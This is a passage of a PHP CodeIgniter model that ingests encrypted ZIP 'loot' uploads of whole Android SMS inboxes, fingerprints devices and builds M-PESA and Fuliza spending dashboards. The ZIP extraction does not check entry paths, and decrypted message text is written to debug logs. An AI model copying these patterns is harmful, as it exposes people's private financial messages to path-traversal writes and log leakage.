<?php

namespace App\Models;

use CodeIgniter\Model;
use App\Models\ModCryption;
use ZipArchive;

class ModUploads extends Model
{
    protected $table = "tbl_Loot";
    protected $primaryKey = "loot_Id";
    protected $allowedFields = [
        'loot_Name', 'loot_Device', 'loot_Owner', 'loot_Uuid', 'loot_Created'
    ];

    /**
     * Normalizes a date value (numeric or string) to Y-m-d H:i:s
     */
    private function normalizeDate($time): string {
        if (empty($time)) return date('Y-m-d H:i:s');
        if (is_numeric($time) && $time > 1000000000000) {
            $timestamp = (int)($time / 1000);
        } else {
            $timestamp = is_numeric($time) ? (int)$time : strtotime((string)$time);
        }
        return date('Y-m-d H:i:s', $timestamp ?: time());
    }

    // (No more MPESA-specific pattern categories — all SMS processed equally)

    // ============ PUBLIC METHODS ============ //

    public function file_upload(array $data): bool {
        return $this->insert($data) ? true : false;
    }

    public function loot_zip_extract(string $zipFilePath): bool {
        $this->validate_zip_file($zipFilePath);

        $extractPath = WRITEPATH . 'uploads/txt_loot/';
        $this->ensure_directory_exists($extractPath);

        $zip = new ZipArchive();
        if ($zip->open($zipFilePath) !== TRUE) {
            throw new \RuntimeException("Failed to open ZIP file");
        }

        $zip->extractTo($extractPath);
        $zip->close();

        return true;
    }

    public function loot_last_uploaded(): ?string {
        $result = $this->db->table($this->table)
            ->selectMax('loot_Uuid')
            ->get();

        return $result->getResult()[0]->loot_Uuid ?? null;
    }

    public function loot_info(string $loot_uuid): array {
        return $this->db->table($this->table)
            ->select('loot_Name, loot_Device, loot_Owner, loot_Uuid')
            ->where('loot_Uuid', $loot_uuid)
            ->get()
            ->getResult();
    }

    public function loot_info_all(string $loot_uuid): array {
        return $this->db->table($this->table)
            ->where('loot_Uuid', $loot_uuid)
            ->get()
            ->getResult();
    }

    public function loot_summary(string $loot_uuid): array {
        return $this->db->table('tbl_Loot_Summary')
            ->where('loot_Uuid', $loot_uuid)
            ->get()
            ->getResult();
    }

    public function loot_parse_sms(
        string $loot_uuid,
        string $loot_owner,
        string $loot_device,
        string $dated,
        ?int $userId = null
    ): array {
        try {
            $this->db->transBegin();

            // 1. Validate and get loot file
            $lootFile = $this->validate_and_get_loot_file($loot_uuid);

            // 2. Load and decrypt content
            $decrypted = $this->decrypt_loot_file($lootFile['path']);

            // 3. Parse JSON data
            $smsData = $this->parse_sms_json($decrypted);

            // 4. Process messages
            $processed = $this->process_sms_messages(
                $smsData,
                $loot_uuid,
                $loot_owner,
                $loot_device,
                $userId
            );

            // 5. Save summary (throws on failure)
            $this->save_summary_data(
                $processed['counters'],
                $loot_uuid,
                $dated,
                $userId
            );

            if ($this->db->transStatus() === false) {
                throw new \RuntimeException('SMS processing transaction failed');
            }

            $this->db->transCommit();

            return [
                'status' => 'success',
                'processed' => $processed['inserted_count'],
                'summary' => $processed['counters']
            ];

        } catch (\Throwable $e) {
            $this->db->transRollback();
            log_message('error', 'SMS Processing Error: ' . $e->getMessage());
            // Re-throw so Upload::upload can return a proper error JSON to the client
            throw $e;
        }
    }

    public function file_listing(string $loot_owner, string $loot_device): array {
        return $this->db->table($this->table)
            ->where('loot_Device', $loot_device)
            ->where('loot_Owner', $loot_owner)
            ->orderBy('loot_Id', 'DESC')
            ->get()
            ->getResult();
    }

    public function device_check_print(array $print_dump): array {
        return $this->db->table('tbl_Devices')
            ->select('device_Uuid')
            ->where($print_dump)
            ->get()
            ->getResult();
    }

    /**
     * Find an existing device by stable identity fields (not the per-request UUID).
     * Matches on the composite device_Fingerprint first, then falls back to the
     * AndroidId (covers devices registered before the composite fingerprint), and
     * finally to model + brand for legacy/custom-ROM devices with no fingerprint.
     */
    public function device_find_by_fingerprint(
        string $fingerprint,
        string $model = '',
        string $brand = '',
        string $androidId = ''
    ): array {
        $builder = $this->db->table('tbl_Devices')->select('device_Uuid');

        if ($fingerprint !== '') {
            $builder->groupStart()
                ->where('device_Fingerprint', $fingerprint);
            if ($androidId !== '') {
                $builder->orWhere('device_AndroidId', $androidId);
            }
            $builder->groupEnd();
        } elseif ($androidId !== '') {
            $builder->where('device_AndroidId', $androidId);
        } else {
            // Fallback when fingerprint is empty (rare / custom ROMs)
            $builder->where('device_Model', $model)
                ->where('device_Brand', $brand);
        }

        return $builder->limit(1)->get()->getResult();
    }

    public function get_loot_uuid(string $loot_name): string {
        $result = $this->db->table($this->table)
            ->select('loot_Uuid')
            ->where('loot_Name', $loot_name)
            ->get()
            ->getResult();

        return $result[0]->loot_Uuid ?? '';
    }

    public function get_loot_summary_from_uuids(array $loot_array_uuids): array {
        return $this->db->table('tbl_Loot_Summary')
            ->select('*')
            ->whereIn('loot_Uuid', $loot_array_uuids)
            ->get()
            ->getResult();
    }

    public function device_make_print(array $print_dump): bool {
        return $this->db->table('tbl_Devices')->insert($print_dump);
    }

    public function getLinkedDevices(int $userId): array
    {
        return $this->db->table('tbl_User_Devices')->where('user_id', $userId)->get()->getResult();
    }

    public function linkDevice(int $userId, string $deviceToken, string $deviceName): bool
    {
        // Check if already linked
        $exists = $this->db->table('tbl_User_Devices')
            ->where(['user_id' => $userId, 'device_token' => $deviceToken])
            ->countAllResults();
            
        if ($exists > 0) return true;
        
        return $this->db->table('tbl_User_Devices')->insert([
            'user_id' => $userId,
            'device_token' => $deviceToken,
            'device_name' => $deviceName,
            'created_at' => date('Y-m-d H:i:s')
        ]);
    }

    /**
     * Resolve every raw access-token string that owns data for the given user.
     *
     * tbl_Sms.sms_owner and tbl_Loot.loot_Owner store the RAW token, while
     * auth_identities.secret stores its SHA-256 hash, so the match is:
     *   auth_identities.secret = SHA2(raw_token, 256)
     */
    public function getOwnedRawTokens(int $userId): array
    {
        $tokenType = \CodeIgniter\Shield\Authentication\Authenticators\AccessTokens::ID_TYPE_ACCESS_TOKEN;

        $rawTokens = [];
        $tokenRows = $this->db->query("
            SELECT DISTINCT s.sms_owner AS tk FROM tbl_Sms s
            INNER JOIN auth_identities i ON i.secret = SHA2(s.sms_owner, 256)
            WHERE i.user_id = ? AND i.type = ?
            UNION
            SELECT DISTINCT l.loot_Owner AS tk FROM tbl_Loot l
            INNER JOIN auth_identities i ON i.secret = SHA2(l.loot_Owner, 256)
            WHERE i.user_id = ? AND i.type = ?
        ", [$userId, $tokenType, $userId, $tokenType])->getResult();

        foreach ($tokenRows as $r) {
            if (!empty($r->tk)) $rawTokens[] = $r->tk;
        }

        return $rawTokens;
    }

    /**
     * Count the upload batches (tbl_Loot rows) owned by a user.
     */
    public function countUploadsForUser(int $userId): int
    {
        $tokens = $this->getOwnedRawTokens($userId);
        if (empty($tokens)) return 0;

        return $this->db->table('tbl_Loot')->whereIn('loot_Owner', $tokens)->countAllResults();
    }

    /**
     * Constrain a builder to the SMS rows owned by the given user.
     * When $userId is null no constraint is applied (global read).
     */
    protected function applyOwnerScope(object $builder, ?int $userId, string $ownerCol = 's.sms_owner'): void
    {
        if ($userId === null) return;

        $tokens = $this->getOwnedRawTokens($userId);
        if (empty($tokens)) {
            $builder->where('1 = 0');
        } else {
            $builder->whereIn($ownerCol, $tokens);
        }
    }

    /**
     * Finds the date of the absolute last upload
     */
    public function getLastUploadDate(): ?string {
        $result = $this->db->table($this->table)
            ->selectMax('loot_Created')
            ->get()
            ->getRow();
        return $result ? $this->normalizeDate($result->loot_Created) : null;
    }

    /**
     * Get the date of the very last transaction in the database
     */
    public function getLatestTransactionDate(): ?string {
        $result = $this->db->table('tbl_Sms')
            ->selectMax('sms_time')
            ->get()
            ->getRow();
        return $result ? $this->normalizeDate($result->sms_time) : null;
    }

    /**
     * Get aggregated metrics for the dashboard within 30 days of last upload
     */
    public function getDashboardMetrics30Days(string $lastDate, ?string $deviceToken = null): array {
        $thirtyDaysAgo = date('Y-m-d H:i:s', strtotime($lastDate . ' -30 days'));
        
        // Try Analyzed data first (use all-time if data is available)
        if ($this->db->tableExists('tbl_Analyzed_Transactions')) {
            $builder = $this->db->table('tbl_Analyzed_Transactions a')
                ->selectSum('a.amount', 'total_amount')
                ->select('a.description');
                
            if ($deviceToken) {
                $builder->join('tbl_Sms s', 's.sms__id = a.orig_sms_id', 'left')
                        ->where('s.sms_owner', $deviceToken);
            }
            
            $analyzed = $builder->groupBy('a.description')->get()->getResult();
            
            if (!empty($analyzed)) {
                $stats = [
                    'current_balance' => 0,
                    'fuliza_balance' => 0,
                    'total_sent_30' => 0,
                    'total_received_30' => 0,
                    'withdrawn_30' => 0,
                    'fuliza_taken_30' => 0,
                    'is_analyzed' => true
                ];
                foreach ($analyzed as $row) {
                    $desc = strtolower($row->description);
                    if ($desc === 'received') $stats['total_received_30'] = (float)$row->total_amount;
                    elseif (in_array($desc, ['sent', 'sent to lnm'])) $stats['total_sent_30'] += (float)$row->total_amount;
                    elseif ($desc === 'withdraw') $stats['withdrawn_30'] = (float)$row->total_amount;
                    elseif ($desc === 'fuliza loan taken') $stats['fuliza_taken_30'] = (float)$row->total_amount;
                }
                
                // Average daily spend and max transaction
                $stats['daily_avg_spend'] = $stats['total_sent_30'] / 30;
                
                $maxBuilder = $this->db->table('tbl_Analyzed_Transactions a')
                    ->selectMax('a.amount', 'amount')
                    ->whereIn('a.description', ['Sent', 'Sent To Lnm']);
                if ($deviceToken) {
                    $maxBuilder->join('tbl_Sms s', 's.sms__id = a.orig_sms_id', 'left')
                               ->where('s.sms_owner', $deviceToken);
                }
                $maxTrans = $maxBuilder->get()->getRow();
                $stats['max_transaction'] = (float)($maxTrans->amount ?? 0);

                // Still need latest balance from raw SMS
                $smsBuilder = $this->db->table('tbl_Sms')
                    ->orderBy('sms_time', 'DESC')
                    ->limit(100);
                if ($deviceToken) {
                    $smsBuilder->where('sms_owner', $deviceToken);
                }
                $latestSms = $smsBuilder->get()->getResult();
                foreach ($latestSms as $sms) {
                    $body = strtolower(base64_decode($sms->sms_body));
                    if ($stats['current_balance'] == 0 && strpos($body, 'new m-pesa balance is ksh') !== false) {
                        $stats['current_balance'] = $this->extractBalance($body);
                    }
                    if ($stats['fuliza_balance'] == 0 && strpos($body, 'fuliza m-pesa limit is ksh') !== false) {
                        $stats['fuliza_balance'] = $this->extractBalance($body);
                    }
                    if ($stats['current_balance'] > 0 && $stats['fuliza_balance'] > 0) break;
                }
                return $stats;
            }
        }

        $stats = [
            'current_balance' => 0,
            'fuliza_balance' => 0,
            'total_sent_30' => 0,
            'total_received_30' => 0,
            'withdrawn_30' => 0,
            'fuliza_taken_30' => 0,
            'is_analyzed' => false
        ];

        $smsBuilder = $this->db->table('tbl_Sms s')
            ->select('s.*, sc.direction as cl_direction, sc.category as cl_cat')
            ->join('tbl_Sms_Classification sc', 'sc.sms_id = s.id', 'left');
        if ($deviceToken) $smsBuilder->where('s.sms_owner', $deviceToken);
        $smsList = $smsBuilder->get()->getResult();
        
        foreach ($smsList as $sms) {
            $body = strtolower(base64_decode($sms->sms_body));
            $amount = $this->extractAmount($body);
            $dir = strtolower($sms->cl_direction ?? '');
            
            if ($dir === 'incoming') {
                $stats['total_received_30'] += $amount;
            } elseif ($dir === 'outgoing') {
                $stats['total_sent_30'] += $amount;
            }
            if (strpos($body, 'new m-pesa balance is ksh') !== false) {
                $stats['current_balance'] = $this->extractBalance($body);
            }
            if (strpos($body, 'fuliza m-pesa limit is ksh') !== false) {
                $stats['fuliza_balance'] = $this->extractBalance($body);
            }
        }

        return $stats;
    }

    /**
     * Detailed Sent Summary (30 days)
     */
    public function getSentSummary30Days(string $lastDate, ?string $deviceToken = null): array {
        $thirtyDaysAgo = date('Y-m-d H:i:s', strtotime($lastDate . ' -30 days'));
        
        if ($this->db->tableExists('tbl_Analyzed_Transactions')) {
            $data = [
                'paybill' => 0,
                'till' => 0,
                'sent_mobile' => 0,
                'fuliza_deductions' => 0
            ];
            
            $builder = $this->db->table('tbl_Analyzed_Transactions a')
                ->select('a.amount, a.description, s.sms_body')
                ->join('tbl_Sms s', 's.sms__id = a.orig_sms_id', 'left')
                ->whereIn('a.description', ['Sent', 'Sent To Lnm', 'Fuliza Loan Paid']);
                
            if ($deviceToken) {
                $builder->where('s.sms_owner', $deviceToken);
            }
                
            $analyzed = $builder->get()->getResult();
            
            if (!empty($analyzed)) {
                foreach ($analyzed as $row) {
                    $body = strtolower(base64_decode($row->sms_body));
                    $amount = (float)$row->amount;
                    if ($row->description === 'Sent To Lnm') {
                        if (strpos($body, 'paybill') !== false) $data['paybill'] += $amount;
                        else $data['till'] += $amount;
                    } elseif ($row->description === 'Sent') {
                        $data['sent_mobile'] += $amount;
                    } elseif ($row->description === 'Fuliza Loan Paid') {
                        $data['fuliza_deductions'] += $amount;
                    }
                }
                return $data;
            }
        }

        $data = [
            'paybill' => 0,
            'till' => 0,
            'sent_mobile' => 0,
            'fuliza_deductions' => 0
        ];

        $smsBuilder = $this->db->table('tbl_Sms s')
            ->select('s.*, sc.direction as cl_direction, sc.category as cl_cat')
            ->join('tbl_Sms_Classification sc', 'sc.sms_id = s.id', 'left')
            ->where('s.sms_time >=', $thirtyDaysAgo)
            ->where('s.sms_time <=', $lastDate);
            
        if ($deviceToken) {
            $smsBuilder->where('s.sms_owner', $deviceToken);
        }
        
        $smsList = $smsBuilder->get()->getResult();

        foreach ($smsList as $sms) {
            $body = strtolower(base64_decode($sms->sms_body));
            $amount = $this->extractAmount($body);
            
            $dir = strtolower($sms->cl_direction ?? '');
            if ($dir !== 'outgoing') continue;
            
            $cat = strtolower($sms->cl_cat ?? '');
            if (strpos($cat, 'payment') !== false || strpos($body, 'paybill') !== false) {
                $data['paybill'] += $amount;
            } elseif (strpos($body, 'till') !== false) {
                $data['till'] += $amount;
            } else {
                $data['sent_mobile'] += $amount;
            }
        }
        return $data;
    }

    /**
     * Detailed Received Summary (30 days)
     */
    public function getReceivedSummary30Days(string $lastDate): array {
        $thirtyDaysAgo = date('Y-m-d H:i:s', strtotime($lastDate . ' -30 days'));
        
        if ($this->db->tableExists('tbl_Analyzed_Transactions')) {
            $data = [
                'total' => 0,
                'banks' => 0,
                'mshwari_kcb' => 0
            ];
            
            $analyzed = $this->db->table('tbl_Analyzed_Transactions a')
                ->select('a.amount, a.description, s.sms_body')
                ->join('tbl_Sms s', 's.sms__id = a.orig_sms_id')
                ->where('a.trans_date >=', $thirtyDaysAgo)
                ->where('a.trans_date <=', $lastDate)
                ->whereIn('a.description', ['Received', 'From Mshwari Account', 'From Kcb'])
                ->get()
                ->getResult();
            
            if (!empty($analyzed)) {
                foreach ($analyzed as $row) {
                    $body = strtolower(base64_decode($row->sms_body));
                    $amount = (float)$row->amount;
                    if ($row->description === 'Received') {
                        $data['total'] += $amount;
                        if (strpos($body, 'bank') !== false) $data['banks'] += $amount;
                    } elseif (in_array($row->description, ['From Mshwari Account', 'From Kcb'])) {
                        $data['mshwari_kcb'] += $amount;
                        $data['total'] += $amount;
                    }
                }
                return $data;
            }
        }

        $data = [
            'total' => 0,
            'banks' => 0,
            'mshwari_kcb' => 0
        ];

        $smsList = $this->db->table('tbl_Sms s')
            ->select('s.*, sc.direction as cl_direction')
            ->join('tbl_Sms_Classification sc', 'sc.sms_id = s.id', 'left')
            ->where('s.sms_time >=', $thirtyDaysAgo)
            ->where('s.sms_time <=', $lastDate)
            ->get()
            ->getResult();

        foreach ($smsList as $sms) {
            $body = strtolower(base64_decode($sms->sms_body));
            $amount = $this->extractAmount($body);
            
            $dir = strtolower($sms->cl_direction ?? '');
            if ($dir === 'incoming') {
                $data['total'] += $amount;
                if (strpos($body, 'bank') !== false) $data['banks'] += $amount;
            }
        }
        return $data;
    }

    /**
     * Fetch recent transactions
     */
    public function getRecentTransactions(int $limit = 10, ?string $deviceToken = null): array {
        $builder = $this->db->table('tbl_Sms s')
            ->select('s.*, a.trans_id as analyzed_id, a.counterparty as analyzed_counterparty, a.amount as analyzed_amount')
            ->join('tbl_Analyzed_Transactions a', 'a.orig_sms_id = s.sms__id', 'left')
            ->orderBy('s.sms_time', 'DESC')
            ->limit($limit);
            
        if ($deviceToken) {
            $builder->where('s.sms_owner', $deviceToken);
        }
        
        return $builder->get()->getResult();
    }

    /**
     * Apply category filter for LLM-based categories (finances, money_in, money_out, notifications)
     */
    private function applyCategoryFilter($builder, string $category): void
    {
        switch ($category) {
            case 'finances':
                $builder->where('sc.is_finance', 1);
                break;
            case 'money_in':
                $builder->where('sc.direction', 'incoming');
                break;
            case 'money_out':
                $builder->where('sc.direction', 'outgoing');
                break;
            case 'notifications':
                $builder->where('sc.is_finance', 0);
                break;
            default:
                if (!empty($category)) {
                    $builder->where('sc.category', $category);
                }
                break;
        }
    }

    /**
     * Count filtered transactions for pagination
     */
    public function countFilteredTransactions(array $f): int {
        $builder = $this->db->table('tbl_Sms s')
            ->join('tbl_Sms_Classification sc', 'sc.sms_id = s.id', 'left')
            ->join('tbl_Analyzed_Transactions a', 'a.orig_sms_id = s.sms__id', 'left');

        if (!empty($f['category'])) {
            $this->applyCategoryFilter($builder, $f['category']);
        }

        if (!empty($f['date_from'])) {
            $builder->where('s.sms_time >=', strtotime($f['date_from'] . ' 00:00:00') * 1000);
        }
        if (!empty($f['date_to'])) {
            $builder->where('s.sms_time <=', strtotime($f['date_to'] . ' 23:59:59') * 1000);
        }

        if (!empty($f['sender'])) {
            $builder->where('sc.sender', $f['sender']);
        }

        if (!empty($f['search'])) {
            $builder->groupStart()
                ->like('s.sms_number', $f['search'])
                ->orLike('a.trans_id', $f['search'])
                ->orLike('a.counterparty', $f['search'])
                ->groupEnd();
        }

        return $builder->countAllResults();
    }

    /**
     * Advanced Filtering — handles numeric sms_time and base64 bodies
     */
    public function getFilteredTransactions(array $f, int $limit = 500, int $offset = 0): array {
        $builder = $this->db->table('tbl_Sms s')
            ->select('s.*, a.trans_id as analyzed_id, a.counterparty as analyzed_counterparty, a.amount as analyzed_amount, sc.category as cl_category, sc.direction as cl_direction')
            ->join('tbl_Analyzed_Transactions a', 'a.orig_sms_id = s.sms__id', 'left')
            ->join('tbl_Sms_Classification sc', 'sc.sms_id = s.id', 'left');

        // Category filter
        if (!empty($f['category'])) {
            $this->applyCategoryFilter($builder, $f['category']);
        }

        // Sender filter (exact match on sc.sender)
        if (!empty($f['sender'])) {
            $builder->where('sc.sender', $f['sender']);
        }

        // Keyword search in number or analyzed fields (body search done in PHP below)
        if (!empty($f['search'])) {
            $builder->groupStart()
                ->like('s.sms_number', $f['search'])
                ->orLike('a.trans_id', $f['search'])
                ->orLike('a.counterparty', $f['search'])
                ->groupEnd();
        }

        $builder->limit($limit, $offset);
        $results = $builder->orderBy('s.sms_time', 'DESC')->get()->getResult();

        // Post-process filters in PHP (handles numeric timestamps and base64 bodies)
        $filtered = [];
        $dateFrom = !empty($f['date_from']) ? strtotime($f['date_from'] . ' 00:00:00') : null;
        $dateTo   = !empty($f['date_to'])   ? strtotime($f['date_to'] . ' 23:59:59')   : null;

        foreach ($results as $sms) {
            $ts = is_numeric($sms->sms_time) && $sms->sms_time > 1000000000000
                ? (int)($sms->sms_time / 1000)
                : (is_numeric($sms->sms_time) ? (int)$sms->sms_time : strtotime($sms->sms_time));

            if ($dateFrom !== null && $ts < $dateFrom) continue;
            if ($dateTo   !== null && $ts > $dateTo)   continue;

            if (!empty($f['search'])) {
                $body = strtolower(base64_decode($sms->sms_body));
                $needle = strtolower($f['search']);
                if (strpos($body, $needle) === false &&
                    stripos($sms->sms_number, $f['search']) === false &&
                    stripos($sms->analyzed_id ?? '', $f['search']) === false &&
                    stripos($sms->analyzed_counterparty ?? '', $f['search']) === false) {
                    continue;
                }
            }

            if (!empty($f['min_amount']) || !empty($f['max_amount'])) {
                $amt = (float)($sms->analyzed_amount ?? $this->extractAmount(base64_decode($sms->sms_body)));
                if (!empty($f['min_amount']) && $amt < (float)$f['min_amount']) continue;
                if (!empty($f['max_amount']) && $amt > (float)$f['max_amount']) continue;
            }

            $filtered[] = $sms;
            if (count($filtered) >= $limit) break;
        }

        return $filtered;
    }

    /**
     * Get data for charts (30 day window, with graceful fallback to all-time)
     */
    public function getAnalyticsData30Days(string $lastDate, ?string $deviceToken = null): array {
        $thirtyDaysAgo = date('Y-m-d', strtotime($lastDate . ' -29 days'));

        $labels    = [];
        $spending  = [];
        $receiving = [];

        // Preload all SMS with classification in the 30-day window
        // Use LIKE for string-based dates (works for both string and numeric timestamps)
        $smsBuilder = $this->db->table('tbl_Sms s')
            ->select('s.*, sc.direction as cl_direction, sc.category as cl_cat, a.amount as analyzed_amount, a.description')
            ->join('tbl_Sms_Classification sc', 'sc.sms_id = s.id', 'left')
            ->join('tbl_Analyzed_Transactions a', 'a.orig_sms_id = s.sms__id', 'left')
            ->groupStart()
                ->where('s.sms_time >=', $thirtyDaysAgo)
                ->where('s.sms_time <=', $lastDate)
            ->groupEnd()
            ->orderBy('s.sms_time', 'ASC');

        if ($deviceToken) $smsBuilder->where('s.sms_owner', $deviceToken);
        $windowSms = $smsBuilder->get()->getResult();

        // Group by date
        $byDate = [];
        foreach ($windowSms as $sms) {
            $ts = is_numeric($sms->sms_time) && $sms->sms_time > 1000000000000
                ? (int)($sms->sms_time / 1000)
                : (is_numeric($sms->sms_time) ? (int)$sms->sms_time : strtotime($sms->sms_time));
            $dateKey = date('Y-m-d', $ts);
            $byDate[$dateKey][] = $sms;
        }

        for ($i = 29; $i >= 0; $i--) {
            $date = date('Y-m-d', strtotime($lastDate . " -$i days"));
            $labels[] = date('d M', strtotime($date));

            $daySpending  = 0;
            $dayReceiving = 0;

            foreach ($byDate[$date] ?? [] as $sms) {
                $amt = $sms->analyzed_amount > 0
                    ? (float)$sms->analyzed_amount
                    : $this->extractAmount(base64_decode($sms->sms_body));
                $dir = strtolower($sms->cl_direction ?? '');
                if ($dir === 'incoming') $dayReceiving += $amt;
                elseif ($dir === 'outgoing') $daySpending += $amt;
            }

            $spending[]  = $daySpending;
            $receiving[] = $dayReceiving;
        }

        // If the 30-day window is completely empty, try to get all data
        $allEmpty = (array_sum($spending) + array_sum($receiving)) === 0;
        if ($allEmpty) {
            $labels   = [];
            $spending = $receiving = [];

            $allBuilder = $this->db->table('tbl_Sms s')
                ->select('s.*, sc.direction as cl_direction, sc.category as cl_cat, a.amount as analyzed_amount')
                ->join('tbl_Sms_Classification sc', 'sc.sms_id = s.id', 'left')
                ->join('tbl_Analyzed_Transactions a', 'a.orig_sms_id = s.sms__id', 'left')
                ->orderBy('s.sms_time', 'ASC');

            if ($deviceToken) $allBuilder->where('s.sms_owner', $deviceToken);
            $allSms = $allBuilder->get()->getResult();

            $byDate = [];
            foreach ($allSms as $sms) {
                $ts = is_numeric($sms->sms_time) && $sms->sms_time > 1000000000000
                    ? (int)($sms->sms_time / 1000)
                    : (is_numeric($sms->sms_time) ? (int)$sms->sms_time : strtotime($sms->sms_time));
                $dateKey = date('Y-m-d', $ts);
                $byDate[$dateKey][] = $sms;
            }

            $dateKeys = array_keys($byDate);
            $slice = array_slice($dateKeys, -30);

            foreach ($slice as $dateKey) {
                $labels[] = date('d M', strtotime($dateKey));
                $daySpending = 0; $dayReceiving = 0;
                foreach ($byDate[$dateKey] as $sms) {
                    $amt = $sms->analyzed_amount > 0
                        ? (float)$sms->analyzed_amount
                        : $this->extractAmount(base64_decode($sms->sms_body));
                    $dir = strtolower($sms->cl_direction ?? '');
                    if ($dir === 'incoming') $dayReceiving += $amt;
                    elseif ($dir === 'outgoing') $daySpending += $amt;
                }
                $spending[]  = $daySpending;
                $receiving[] = $dayReceiving;
            }
        }

        // Category breakdown using cl_category from classification
        $categories = [];
        foreach ($windowSms ?: $allSms ?? [] as $sms) {
            $amt = $sms->analyzed_amount > 0
                ? (float)$sms->analyzed_amount
                : $this->extractAmount(base64_decode($sms->sms_body));
            $dir = strtolower($sms->cl_direction ?? '');
            $cat = $sms->cl_cat ?? 'Unclassified';
            $key = $dir === 'incoming' ? 'Inflow: ' . $cat : ($dir === 'outgoing' ? 'Outflow: ' . $cat : $cat);
            if (!isset($categories[$key])) $categories[$key] = 0;
            $categories[$key] += $amt;
        }
        arsort($categories);

        $fulizaTaken = array_fill(0, count($labels), 0);
        $fulizaPaid  = array_fill(0, count($labels), 0);

        return [
            'labels'       => $labels,
            'spending'     => $spending,
            'receiving'    => $receiving,
            'categories'   => $categories,
            'fuliza_taken' => $fulizaTaken,
            'fuliza_paid'  => $fulizaPaid,
        ];
    }

    /**
     * Helper to extract amount from SMS body
     */
    private function extractAmount(string $body): float {
        // Match "Ksh 1,200.00" or "Ksh. 1200"
        if (preg_match('/ksh\s*([0-9,]+\.[0-9]{2}|[0-9,]+)/i', $body, $matches)) {
            return (float) str_replace(',', '', $matches[1]);
        }
        return 0;
    }

    /**
     * Helper to extract balance from SMS body
     */
    private function extractBalance(string $body): float {
        if (preg_match('/balance is ksh\s*([0-9,]+\.[0-9]{2}|[0-9,]+)/i', $body, $matches)) {
            return (float) str_replace(',', '', $matches[1]);
        }
        return 0;
    }

    // ============ PROTECTED METHODS ============ //

    protected function clean_sms_by_returning_column(array $smsMessages, string $columnName): array {
        $columnData = [];
        $property = $columnName === 'Thread Id' ? 'Thread Id' : $columnName;

        foreach ($smsMessages as $sms) {
            $columnData[] = $sms->$property ?? '';
        }

        return $columnData;
    }

    protected function validate_zip_file(string $path): void {
        if (!file_exists($path)) {
            throw new \RuntimeException("ZIP file not found");
        }

        if (mime_content_type($path) !== 'application/zip') {
            throw new \RuntimeException("Invalid file type");
        }
    }

    protected function ensure_directory_exists(string $path): void {
        if (!is_dir($path)) {
            mkdir($path, 0755, true);
        }
    }

    protected function validate_and_get_loot_file(string $uuid): array {
        $query = $this->db->table($this->table)
            ->select('loot_Name')
            ->where('loot_Uuid', $uuid)
            ->get();

        if ($query->getNumRows() === 0) {
            throw new \RuntimeException("Loot record not found");
        }

        $fileName = $query->getRow()->loot_Name;
        $filePath = WRITEPATH . "uploads/txt_loot/" . $fileName;

        if (!file_exists($filePath)) {
            throw new \RuntimeException("Loot file not found");
        }

        return [
            'name' => $fileName,
            'path' => $filePath
        ];
    }

    protected function decrypt_loot_file(string $path): string {
        $modCryption = new ModCryption();
        $content = file_get_contents($path);
        
        log_message('debug', 'File path: ' . $path);
        log_message('debug', 'File size: ' . filesize($path));
        log_message('debug', 'File content first 32 bytes: ' . bin2hex(substr($content, 0, 32)));
        
        $decrypted = $modCryption->decode_content($content);

        if (empty($decrypted)) {
            throw new \RuntimeException("Failed to decrypt file");
        }

        log_message('debug', 'Decrypted content length: ' . strlen($decrypted));
        log_message('debug', 'Decrypted content first 200 chars: ' . substr($decrypted, 0, 200));

        return $decrypted;
    }

    protected function parse_sms_json(string $data): array {
        $transformations = [
            '-------(//)--------' => '',
            "\n" => '****',
            '****"' => '"'
        ];

        $normalized = str_replace(
            array_keys($transformations),
            array_values($transformations),
            $data
        );

        $json = json_decode('[' . substr($normalized, 0, -2) . '}]');

        if (json_last_error() !== JSON_ERROR_NONE) {
            log_message('error', 'JSON parse error: ' . json_last_error_msg());
            log_message('debug', 'Normalized data first 500 chars: ' . substr($normalized, 0, 500));
            throw new \RuntimeException("JSON parse error: " . json_last_error_msg());
        }

        return $json;
    }

    protected function process_sms_messages(
        array $smsData,
        string $uuid,
        string $owner,
        string $device,
        ?int $userId = null
    ): array {
        // Process ALL SMS equally — no MPESA-specific filter or pattern matching
        $inserted = 0;
        $smsIds = [];
        $total = count($smsData);

        foreach (array_chunk($smsData, 100) as $chunk) {
            $batch = [];
            foreach ($chunk as $sms) {
                $number = isset($sms->Number) ? strtoupper(trim((string) $sms->Number)) : '';
                $smsBody = isset($sms->Body) ? trim((string) $sms->Body) : '';

                $batch[] = [
                    'sms_type' => $sms->Type ?? '',
                    'sms_number' => $number,
                    'sms_thread_id' => $sms->{'Thread Id'} ?? '',
                    'sms_time' => $sms->Date ?? '',
                    'sms_seen' => $sms->Seen ?? '',
                    'sms__id' => $sms->ID ?? '',
                    'sms_body' => $smsBody,
                    'sms_loot_source' => $uuid,
                    'sms_owner' => $owner,
                    'sms_device' => $device,
                    'sms_user_id' => $userId
                ];
            }

            $this->db->table('tbl_Sms')->ignore(true)->insertBatch($batch);
            $inserted += count($chunk);

            $firstId = $this->db->insertID();
            for ($i = 0; $i < count($chunk); $i++) {
                $smsIds[] = $firstId + $i;
            }
        }

        // Write a default classification for each inserted SMS (pending LLM analysis)
        $classBatch = [];
        $idx = 0;
        foreach ($smsIds as $smsId) {
            if ($idx >= count($smsData)) break;
            $sms = $smsData[$idx];
            $number = isset($sms->Number) ? strtoupper(trim((string) $sms->Number)) : '';
            $classBatch[] = [
                'sms_id'     => $smsId,
                'sender'     => $number,
                'category'   => 'Unclassified',
                'direction'  => 'none',
                'is_finance' => 0,
                'method'     => 'upload',
                'confidence' => 0.5000,
                'user_id'    => $userId,
                'created_at' => date('Y-m-d H:i:s'),
            ];
            $idx++;
        }

        if (!empty($classBatch)) {
            $this->db->table('tbl_Sms_Classification')
                ->ignore(true)
                ->insertBatch($classBatch);
        }

        return [
            'inserted_count' => $inserted,
            'counters' => ['info_All' => $total],
        ];
    }

    /**
     * Infer direction from a human-readable category string.
     */
    protected function infer_direction(string $category): string
    {
        $lower = strtolower($category);
        $incomingPatterns = ['received', 'from ', 'reversal', 'loan taken', 'loan limit', 'fuliza loan taken', 'balance'];
        $outgoingPatterns = ['sent', 'paid to', 'withdraw', 'sent cancel', 'fuliza loan paid'];

        foreach ($incomingPatterns as $p) {
            if (str_contains($lower, $p)) return 'incoming';
        }
        foreach ($outgoingPatterns as $p) {
            if (str_contains($lower, $p)) return 'outgoing';
        }
        return 'none';
    }

    /**
     * Save upload summary — total SMS count + LLM direction/transaction_type breakdowns.
     */
    protected function save_summary_data(array $counters, string $uuid, int|string $date, ?int $userId = null): bool {
        // Compute direction breakdown from classified SMS for this loot
        $directionBreakdown = $this->get_direction_breakdown_for_loot($uuid);
